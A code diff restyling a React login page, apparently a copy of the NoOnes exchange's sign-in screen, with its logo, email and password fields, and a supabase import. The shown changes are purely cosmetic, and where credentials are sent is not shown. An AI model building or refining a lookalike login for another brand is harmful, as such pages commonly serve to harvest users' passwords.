@@ -5,7 +5,7 @@ import { supabase } from '../../lib/supabase';
 function NoonesLogo() {
   return (
     <div className="flex items-center justify-center">
-      <svg width="160" height="50" viewBox="0 0 180 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <svg width="150" height="48" viewBox="0 0 180 60" fill="none" xmlns="http://www.w3.org/2000/svg">
         {/* n */}
         <path d="M10 25V45H18V28.5C18 24.5 21 21.5 25 21.5C29 21.5 32 24.5 32 28.5V45H40V28.5C40 20.5 33.5 14 25 14C19 14 14 18 11.5 23V15H3V45H11V25H10Z" fill="#00C076"/>
         {/* o with sparkle */}
@@ -28,7 +28,7 @@ function NoonesLogo() {
 
 export default function NoonesConnect() {
   const navigate = useNavigate();
-  const [isDarkMode, setIsDarkMode] = useState(false);
+  const [isDarkMode, setIsDarkMode] = useState(true);
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
   const [credentials, setCredentials] = useState({
@@ -70,104 +70,102 @@ export default function NoonesConnect() {
     : 'bg-[#f4f7f6] text-[#1a1b1e]';
   
   const cardClasses = isDarkMode
-    ? 'bg-[#25262b] border-transparent'
-    : 'bg-white border-transparent shadow-[0_8px_30px_rgb(0,0,0,0.04)]';
+    ? 'bg-[#25262b]'
+    : 'bg-white shadow-[0_4px_24px_rgba(0,0,0,0.04)]';
 
   const inputClasses = isDarkMode
-    ? 'bg-[#2c2e33] border-transparent text-white placeholder:text-[#5c5f66]'
-    : 'bg-[#f0f2f1] border-transparent text-[#1a1b1e] placeholder:text-[#adb5bd]';
+    ? 'bg-[#2c2e33] text-white placeholder:text-[#5c5f66]'
+    : 'bg-[#f0f2f1] text-[#1a1b1e] placeholder:text-[#adb5bd]';
 
   return (
-    <main className={`${themeClasses} min-h-screen flex flex-col items-center justify-center p-4 font-sans transition-colors duration-300`}>
-      <div className="w-full max-w-[500px] flex flex-col items-center">
+    <main className={`${themeClasses} h-screen w-full flex flex-col items-center justify-center py-4 sm:py-8 overflow-hidden font-sans transition-colors duration-300`}>
+      <div className="w-full max-w-[460px] flex flex-col items-center px-4 space-y-6">
         {/* Logo */}
-        <div className="mb-12">
-          <NoonesLogo />
-        </div>
+        <NoonesLogo />
 
         {/* Card */}
-        <div className={`${cardClasses} w-full rounded-[24px] p-10 flex flex-col items-center`}>
-          <h2 className="text-[32px] font-bold mb-8">Welcome for NoOnes</h2>
+        <div className={`${cardClasses} w-full rounded-[24px] p-8 sm:p-10 flex flex-col items-center`}>
+          <h2 className="text-[28px] sm:text-[32px] font-bold mb-6 text-center whitespace-nowrap">Welcome for NoOnes</h2>
           
           {/* Social Icons */}
-          <div className="flex gap-6 mb-10">
-            <button className="w-12 h-12 rounded-full flex items-center justify-center">
-              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-10 h-10" />
+          <div className="flex gap-6 mb-8">
+            <button className="w-10 h-10 flex items-center justify-center">
+              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-9 h-9" />
             </button>
-            <button className="w-12 h-12 rounded-full flex items-center justify-center">
-              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-10 h-10 ${isDarkMode ? 'invert' : ''}`} />
+            <button className="w-10 h-10 flex items-center justify-center">
+              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-9 h-9 ${isDarkMode ? 'invert' : ''}`} />
             </button>
-            <button className="w-12 h-12 rounded-full flex items-center justify-center">
-              <img src="/logos/telegram-svgrepo-com.svg" alt="Telegram" className="w-10 h-10" />
+            <button className="w-10 h-10 flex items-center justify-center">
+              <img src="/logos/telegram-svgrepo-com.svg" alt="Telegram" className="w-9 h-9" />
             </button>
           </div>
 
-          <form onSubmit={handleSubmit} className="w-full space-y-6">
-            <div>
-              <label className="block text-[16px] font-bold mb-2 opacity-80">Email/Phone number</label>
+          <form onSubmit={handleSubmit} className="w-full space-y-5">
+            <div className="space-y-2">
+              <label className="block text-[14px] font-bold text-gray-500">Email/Phone number</label>
               <input
                 type="text"
                 value={credentials.email}
                 onChange={handleFieldChange('email')}
                 placeholder="Email/Phone number"
-                className={`${inputClasses} w-full h-[64px] px-6 rounded-2xl border-none outline-none focus:ring-2 focus:ring-[#00c076] transition-all text-[18px]`}
+                className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
               />
             </div>
 
-            <div>
-              <label className="block text-[16px] font-bold mb-2 opacity-80">Password</label>
+            <div className="space-y-2">
+              <label className="block text-[14px] font-bold text-gray-500">Password</label>
               <div className="relative">
                 <input
                   type="password"
                   value={credentials.password}
                   onChange={handleFieldChange('password')}
                   placeholder="Password"
-                  className={`${inputClasses} w-full h-[64px] px-6 rounded-2xl border-none outline-none focus:ring-2 focus:ring-[#00c076] transition-all text-[18px]`}
+                  className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
                 />
-                <div className="absolute right-6 top-1/2 -translate-y-1/2 opacity-60">
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                <div className="absolute right-4 top-1/2 -translate-y-1/2 opacity-60">
+                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="rotate-180"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                 </div>
               </div>
-              <div className="flex justify-end mt-2">
-                <button type="button" className="text-[#00c076] text-[16px] font-bold hover:underline">Don forget password?</button>
+              <div className="flex justify-end">
+                <button type="button" className="text-[#00c076] text-[14px] font-bold hover:underline">Don forget password?</button>
               </div>
             </div>
 
-            {errorMessage && <p className="text-red-500 text-sm font-semibold">{errorMessage}</p>}
+            {errorMessage && <p className="text-red-500 text-[13px] font-semibold text-center">{errorMessage}</p>}
 
             <button
               type="submit"
               disabled={loading}
-              className="w-full h-[68px] bg-[#00c076] hover:bg-[#00a868] text-white font-bold text-[22px] rounded-2xl transition-colors disabled:opacity-70 mt-6"
+              className="w-full h-[60px] bg-[#00c076] hover:bg-[#00a868] text-white font-bold text-[20px] rounded-xl transition-colors disabled:opacity-70 mt-4"
             >
               {loading ? 'Connecting...' : 'Log in'}
             </button>
 
-            <div className="text-center mt-10">
-              <p className="text-[18px] font-medium opacity-80">
+            <div className="text-center mt-8">
+              <p className="text-[16px] font-medium text-gray-400">
                 No account yet? <span className="text-[#00c076] cursor-pointer font-bold hover:underline">Sign up</span>
               </p>
             </div>
           </form>
         </div>
 
-        {/* Footer Controls */}
-        <div className="w-full mt-10 flex items-center justify-between px-4">
-          <div className="flex items-center gap-4">
+        {/* Footer at Bottom */}
+        <div className="w-full flex items-center justify-between pt-4">
+          <div className="flex items-center gap-3">
             <div 
               onClick={() => setIsDarkMode(!isDarkMode)}
               className="flex items-center gap-3 cursor-pointer group"
             >
-              <span className={`text-2xl ${!isDarkMode ? 'grayscale-0' : 'grayscale'}`}>☀️</span>
-              <div className={`w-14 h-7 rounded-full relative transition-colors ${isDarkMode ? 'bg-[#00c076]' : 'bg-gray-300'}`}>
-                <div className={`absolute top-1 w-5 h-5 rounded-full bg-white shadow-md transition-transform ${isDarkMode ? 'translate-x-8' : 'translate-x-1'}`} />
+              <span className={`text-2xl ${!isDarkMode ? 'opacity-100' : 'opacity-40'}`}>☀️</span>
+              <div className={`w-12 h-6 rounded-full relative transition-colors ${isDarkMode ? 'bg-[#00c076]' : 'bg-gray-300'}`}>
+                <div className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow-md transition-transform ${isDarkMode ? 'translate-x-7' : 'translate-x-1'}`} />
               </div>
-              <span className={`text-2xl ${isDarkMode ? 'grayscale-0' : 'grayscale'}`}>🌙</span>
+              <span className={`text-2xl ${isDarkMode ? 'opacity-100' : 'opacity-40'}`}>🌙</span>
             </div>
           </div>
           
-          <button className="flex items-center gap-2 text-[18px] font-bold text-[#00c076] hover:underline">
-            Nigerian Pidgin <span className="text-[14px] ml-1">▼</span>
+          <button className="flex items-center gap-1 text-[16px] font-bold text-[#00c076] hover:underline">
+            Nigerian Pidgin <span className="text-[12px] ml-0.5">▼</span>
           </button>
         </div>
       </div>
